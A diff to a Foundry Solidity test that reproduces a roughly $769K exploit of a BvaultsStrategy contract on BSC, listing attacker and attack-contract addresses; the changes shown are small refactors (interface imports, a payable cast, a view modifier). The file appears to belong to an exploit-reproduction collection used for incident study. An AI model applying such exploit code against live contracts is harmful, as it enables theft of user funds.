@@ -3,6 +3,10 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+
+import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
+import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
 // @KeyInfo - Total Lost : ~$769K
 // Attacker : https://bscscan.com/address/0xce27b195fa6de27081a86b98b64f77f5fb328dd5
 // Attack Contract : https://bscscan.com/address/0xe1997bc971d5986aa57ee8ffb57eb1deba4fdaaa
@@ -24,7 +28,7 @@ contract ContractTest is Test {
     IERC20 private constant ALPACA = IERC20(0x8F0528cE5eF7B51152A59745bEfDD91D97091d2F);
     IERC20 private constant BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
     IUniswapV2Pair private constant CAKE_WBNB = IUniswapV2Pair(0x0eD7e52944161450477ee417DE9Cd3a859b14fD0);
-    IUniswapV2Router private constant Router = IUniswapV2Router(0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F);
+    IUniswapV2Router private constant Router = IUniswapV2Router(payable(0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F));
     IBvaultsStrategy private constant BvaultsStrategy = IBvaultsStrategy(0x21125d94Cfe886e7179c8D2fE8c1EA8D57C73E0e);
     address private constant exploitContractAddr = 0xe1997bC971D5986AA57Ee8ffB57eb1DeBa4fDAaa;
     address private constant helperExpContractAddr = 0x1ccC8eE8Ad0f70E0Bb362d56035fF241755192b1;
@@ -95,7 +99,7 @@ contract ContractTest is Test {
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn, 0, path, address(this), block.timestamp);
     }
 
-    function getAmount() internal returns (uint256) {
+    function getAmount() internal view returns (uint256) {
         // Value taken from original, selfdestructed contract. Used in amount calculation
         uint256 amount = uint256(vm.load(exploitContractAddr, bytes32(uint256(6))));
         return ((amount / 9975) * 10_000) + 10_000;
